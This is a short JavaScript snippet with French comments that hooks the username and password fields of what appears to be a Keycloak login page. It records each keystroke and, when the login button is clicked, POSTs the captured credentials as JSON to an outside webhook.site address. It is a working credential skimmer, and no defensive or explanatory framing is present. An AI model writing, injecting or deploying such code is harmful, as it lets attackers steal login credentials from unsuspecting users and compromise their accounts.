(function() {
  let username = "";
  let password = "";

  // On récupère les champs du formulaire
  const userInput = document.getElementById('username');
  const passInput = document.getElementById('password');

  // On écoute l'input sur le username
  if (userInput) {
    userInput.addEventListener('input', function(e) {
      username = e.target.value;
      console.log("Username =>", username);
    });
  }

  // On écoute l'input sur le password
  if (passInput) {
    passInput.addEventListener('input', function(e) {
      password = e.target.value;
      console.log("Password =>", password);
    });
  }

  // On intercepte le clic sur le bouton Connexion
  const loginButton = document.getElementById('kc-login');
  if (loginButton) {
    loginButton.addEventListener('click', function(e) {
      // Ici on peut envoyer vers un serveur distant
      fetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: username,
          password: password
        })
      });

      console.log("Envoi des données =>", username, password);
    });
  }
})();
